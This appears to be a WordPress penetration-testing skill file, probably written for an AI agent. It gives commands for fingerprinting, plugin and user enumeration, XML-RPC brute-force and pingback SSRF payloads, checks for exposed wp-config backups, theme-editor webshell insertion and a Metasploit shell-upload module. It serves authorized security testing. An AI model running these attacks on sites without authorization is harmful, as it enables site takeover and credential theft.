---
name: wordpress
description: WordPress-specific penetration testing — version fingerprinting, plugin/theme enumeration, user enumeration, XML-RPC abuse, wpscan, and known CVE exploitation
---

# WordPress Penetration Testing

WordPress powers ~43% of the web. Its plugin/theme ecosystem is the primary attack surface — thousands of third-party plugins with varying security quality. Always enumerate core version, active plugins, active themes, and users before looking for specific vulnerabilities.

## Attack Surface

**Core WordPress**
- Version disclosure via `readme.html`, `feed`, RSS meta generator tag
- Outdated core with known CVEs (auth bypass, RCE, privilege escalation)
- Default admin username (`admin`) still in use
- `wp-login.php` exposed without brute-force protection
- `xmlrpc.php` enabled — amplification brute force, SSRF, content injection
- `wp-json/wp/v2/users` — user enumeration via REST API
- `?author=1` redirect — username enumeration via author archive

**Plugins & Themes**
- Outdated plugins with public CVEs (SQLi, XSS, LFI, RCE, auth bypass)
- Deactivated plugins still present on disk (code still accessible)
- Plugin version disclosure via `readme.txt` in plugin directory
- Nulled/pirated themes/plugins with backdoors

**Configuration**
- `wp-config.php` backup exposed (`wp-config.php.bak`, `wp-config.php~`)
- Debug log publicly accessible (`/wp-content/debug.log`)
- Directory listing on `wp-content/uploads/`
- Uploads directory allows PHP execution
- `wp-cron.php` publicly accessible (resource abuse)
- Default database prefix `wp_` (aids SQL injection exploitation)

**User & Authentication**
- Weak passwords on admin accounts
- User enumeration → targeted brute force
- No lockout on `wp-login.php`
- Application passwords feature misuse (REST API auth bypass)
- JWT/cookie auth plugins with weak secret

## Fingerprinting & Enumeration

### Version Detection

```bash
# readme.html (most reliable)
curl -s https://target.com/readme.html | grep -i "version"

# RSS generator tag
curl -s "https://target.com/?feed=rss2" | grep "generator"
# → <generator>https://wordpress.org/?v=6.4.2</generator>

# Meta tag in HTML source
curl -s https://target.com/ | grep "generator"
# → <meta name="generator" content="WordPress 6.4.2" />

# wpscan
wpscan --url https://target.com --enumerate vp,vt,u
```

### Plugin Enumeration

```bash
# wpscan (aggressive — checks all known plugins)
wpscan --url https://target.com --enumerate ap --plugins-detection aggressive

# Manual: check readme.txt for version
curl -s https://target.com/wp-content/plugins/<plugin-name>/readme.txt | grep "Stable tag"

# Common high-value plugins to probe
/wp-content/plugins/woocommerce/readme.txt
/wp-content/plugins/contact-form-7/readme.txt
/wp-content/plugins/elementor/readme.txt
/wp-content/plugins/wp-file-manager/readme.txt       ← critical RCE history
/wp-content/plugins/revslider/readme.txt              ← LFI history
/wp-content/plugins/gravityforms/readme.txt
/wp-content/plugins/advanced-custom-fields/readme.txt
```

### User Enumeration

```bash
# REST API (WordPress 4.7+, often enabled)
curl -s "https://target.com/wp-json/wp/v2/users" | jq '.[].slug'

# Author archive redirect (all versions)
curl -sI "https://target.com/?author=1" | grep Location
curl -sI "https://target.com/?author=2" | grep Location
# → /author/admin/ reveals username

# wpscan user enumeration
wpscan --url https://target.com --enumerate u

# Login error messages
# "The password you entered for the username admin is incorrect"
# → confirms username exists
```

### XML-RPC Detection

```bash
# Check if enabled
curl -s -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'

# If responds with method list → XML-RPC active
```

## Key Vulnerabilities

### XML-RPC Brute Force (Amplification)

XML-RPC allows testing multiple passwords in a single HTTP request via `system.multicall`:

```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    <value><struct>
      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
      <member><name>params</name><value><array><data>
        <value><array><data>
          <value><string>admin</string></value>
          <value><string>password1</string></value>
        </data></array></value>
      </data></array></value></member>
    </struct></value>
    <!-- repeat with different passwords -->
  </data></array></value></param></params>
</methodCall>
```

Tool: `wpscan --url https://target.com --passwords wordlist.txt --usernames admin --xmlrpc`

### wp-login.php Brute Force

```bash
wpscan --url https://target.com \
  --usernames admin,editor \
  --passwords /usr/share/wordlists/rockyou.txt \
  --max-threads 5
```

### REST API User Enumeration → Brute Force Chain

```bash
# Step 1: enumerate usernames
curl "https://target.com/wp-json/wp/v2/users?per_page=100" | jq '.[].slug'

# Step 2: brute force with discovered usernames
wpscan --url https://target.com --usernames $(cat users.txt) --passwords wordlist.txt
```

### Plugin Vulnerability Exploitation

After identifying plugin version, query CVE/WPScan DB:

```bash
# wpscan with API token (includes known plugin vulns)
wpscan --url https://target.com --api-token <TOKEN> --enumerate ap

# Manual CVE lookup: search "<plugin name> <version> CVE"
# High-value historical plugin CVEs:
# WP File Manager < 6.9     → CVE-2020-25213 (unauth RCE)
# Revolution Slider < 4.2   → Arbitrary File Download / LFI
# WooCommerce < 3.6.5       → Auth bypass / SQLi
# Duplicator < 1.3.28       → Unauth arbitrary file read
# Contact Form 7 < 5.3.2    → Unrestricted file upload
# Elementor Pro < 3.11.7    → Auth bypass / RCE
# Advanced Custom Fields    → CVE-2023-30777 (reflected XSS)
```

### wp-config.php Backup Exposure

```bash
for path in wp-config.php.bak wp-config.php~ wp-config.php.old wp-config.bak .wp-config.php.swp; do
  code=$(curl -so /dev/null -w '%{http_code}' "https://target.com/$path")
  echo "$path → $code"
done
```

If 200 → DB credentials, secret keys, auth salts exposed.

### Debug Log Exposure

```bash
curl -s "https://target.com/wp-content/debug.log"
# May contain: file paths, DB errors, stack traces, credentials
```

### Uploads Directory PHP Execution

```bash
# Check if uploads allows directory listing
curl -s "https://target.com/wp-content/uploads/" | grep -i "index of"

# If file upload vuln found elsewhere: upload .php to uploads/
# Check if PHP executes there (should be blocked by .htaccess)
curl "https://target.com/wp-content/uploads/shell.php"
```

### SSRF via WordPress Pingback / XMLRPC

```bash
# Pingback can be used to probe internal network
curl -s -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://internal-host/</string></value></param>
    <param><value><string>https://target.com/</string></value></param>
  </params>
</methodCall>'
```

## Testing Methodology

1. **Version fingerprint** — `readme.html`, RSS generator, meta tag
2. **User enumeration** — REST API `/wp-json/wp/v2/users`, `?author=N`, login error messages
3. **Plugin/theme enum** — `wpscan --enumerate ap,at` (aggressive mode for complete coverage)
4. **CVE mapping** — for each plugin/theme version found, check WPScan DB + NVD
5. **XML-RPC check** — enabled? → amplified brute force, SSRF, pingback abuse
6. **Credential attack** — brute force `wp-login.php` and/or XML-RPC with enumerated usernames
7. **Backup/config exposure** — `wp-config.php.*`, `debug.log`, `error_log`
8. **Uploads audit** — directory listing, PHP execution, sensitive file exposure
9. **REST API audit** — beyond `/users`: check all exposed endpoints for unauth access
10. **Admin panel** — if credentials obtained: check theme editor (PHP exec), plugin install, user creation

## Post-Authentication

If admin access is obtained:

```
Appearance → Theme Editor → 404.php → insert PHP webshell
→ https://target.com/?p=404  (trigger 404)

Plugins → Plugin Editor → edit active plugin file → insert payload

Plugins → Add New → upload malicious plugin .zip
```

```bash
# MSF module for wp-admin shell upload
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS target.com
set USERNAME admin
set PASSWORD password
set TARGETURI /
run
```

## wpscan Cheat Sheet

```bash
# Full enumeration with API token
wpscan --url https://target.com --api-token TOKEN \
  --enumerate vp,vt,u,m \
  --plugins-detection aggressive \
  --themes-detection aggressive

# Flags:
# vp  = vulnerable plugins
# vt  = vulnerable themes
# u   = users (1-10)
# m   = media (enumerate media IDs)
# ap  = all plugins
# at  = all themes

# Password attack
wpscan --url https://target.com \
  --usernames admin \
  --passwords /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt

# Disable SSL verification (self-signed cert)
wpscan --url https://target.com --disable-tls-checks
```

## Impact

- **Unauthenticated RCE** via vulnerable plugin (e.g., WP File Manager CVE-2020-25213)
- **Full site compromise** via admin credential brute force → theme editor PHP exec
- **Data exfiltration** via SQLi in vulnerable plugin → full DB dump including user hashes
- **Credential exposure** via `wp-config.php` backup → DB access, auth key reuse
- **SSRF** via XML-RPC pingback → internal network reconnaissance

## Pro Tips

1. `wpscan --api-token` provides vuln data for detected plugins — register free at wpscan.com (25 API calls/day free)
2. Plugin deactivation doesn't remove files — scan for deactivated vulnerable plugins too
3. `readme.txt` in plugin directory always contains version even if hidden from frontend
4. Check `wp-json/wp/v2/` for all exposed REST routes: `curl https://target.com/wp-json/ | jq '.routes | keys'`
5. `wp-cron.php` DoS: if publicly accessible, repeated hits trigger scheduled tasks → resource exhaustion
6. Many WP sites use the same secret key salts across environments — `wp-config.php` key reuse is a pivot point
7. Multisite installations expose additional attack surface: `/wp-signup.php`, `/wp-activate.php`, per-site admin panels
8. Check `/.git/` — WordPress sites deployed via git sometimes expose the full source including `wp-config.php`
